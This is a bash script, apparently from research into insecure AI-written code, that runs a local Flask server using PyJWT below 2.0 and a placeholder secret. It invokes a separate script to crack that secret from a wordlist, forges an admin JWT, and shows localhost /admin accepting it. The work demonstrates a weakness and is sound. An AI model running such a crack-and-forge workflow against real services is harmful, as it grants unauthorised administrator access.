#!/usr/bin/env bash
# End-to-end demo for jwt_001 (Flask, PyJWT < 2.0).
#
# Installs deps into the project venv, starts the AI's middleware on
# port 5081, runs ../crack-and-forge.sh to crack 'your-secret-key' and
# forge an admin token, then curls /admin with the forged token to
# show the server accepts it. Server is killed on exit.
#
# Usage:
#   ./run-demo.sh                  # default — uses SecLists wordlist
#   ./run-demo.sh ../wordlists/ai-placeholder-secrets.txt
#                                  # opt-in fast 20-entry wordlist

set -euo pipefail

cd "$(dirname "$0")"
SCRIPT_DIR="$(pwd)"
DEMO_DIR="$(cd .. && pwd)"
REPO_ROOT="$(cd ../../.. && pwd)"
PORT=5081

PYTHON="${PYTHON:-$REPO_ROOT/venv/bin/python}"
PIP="${PIP:-$REPO_ROOT/venv/bin/pip}"
WORDLIST="${1:-}"

if [ ! -x "$PYTHON" ]; then
    echo "Error: cannot find project venv python at $PYTHON" >&2
    echo "  Create it: python3 -m venv $REPO_ROOT/venv" >&2
    exit 1
fi

# Install deps (Flask + PyJWT<2.0) — idempotent, fast on subsequent runs.
echo "=== Step 0a: install Flask + PyJWT<2.0 into project venv ==="
"$PIP" install -q -r requirements.txt
echo "  ok"
echo

echo "=== Step 0b: start the AI's Flask middleware on port $PORT ==="
"$PYTHON" server.py > /tmp/jwt_001_server.log 2>&1 &
SERVER_PID=$!
trap "kill $SERVER_PID 2>/dev/null || true" EXIT

# Wait for the server to be listening (Flask prints to stderr; just poll the port).
for _ in $(seq 1 20); do
    if curl -sf "http://127.0.0.1:$PORT/admin" -o /dev/null \
       || curl -s "http://127.0.0.1:$PORT/admin" | grep -q "Token is missing"; then
        break
    fi
    sleep 0.1
done
echo "  server PID: $SERVER_PID (will stop on script exit)"
echo

echo "=== Step 1: crack the placeholder secret + forge an admin token ==="
if [ -n "$WORDLIST" ]; then
    CRACK_OUTPUT="$("$DEMO_DIR/crack-and-forge.sh" jwt_001 "$WORDLIST")"
else
    CRACK_OUTPUT="$("$DEMO_DIR/crack-and-forge.sh" jwt_001)"
fi
echo "$CRACK_OUTPUT" | sed 's/^/  /'
echo

# Extract the forged token from the crack-and-forge output.
FORGED="$(echo "$CRACK_OUTPUT" | awk '/Forged admin token:/{getline; gsub(/^ +/, ""); print; exit}')"
if [ -z "$FORGED" ]; then
    echo "Error: could not extract forged token from crack-and-forge output." >&2
    exit 2
fi

echo "=== Step 2: send the forged token to the AI's /admin endpoint ==="
echo "  curl -H \"x-access-tokens: <forged>\" http://127.0.0.1:$PORT/admin"
echo "  response:"
curl -s -H "x-access-tokens: $FORGED" "http://127.0.0.1:$PORT/admin" | sed 's/^/    /'
echo
echo

echo "=== Done ==="
echo "The AI's middleware verified the forged signature with the placeholder"
echo "secret and returned AUTHENTICATED ADMIN ACCESS for user_id=99 — a user"
echo "id we picked, not one issued by a legitimate login flow."
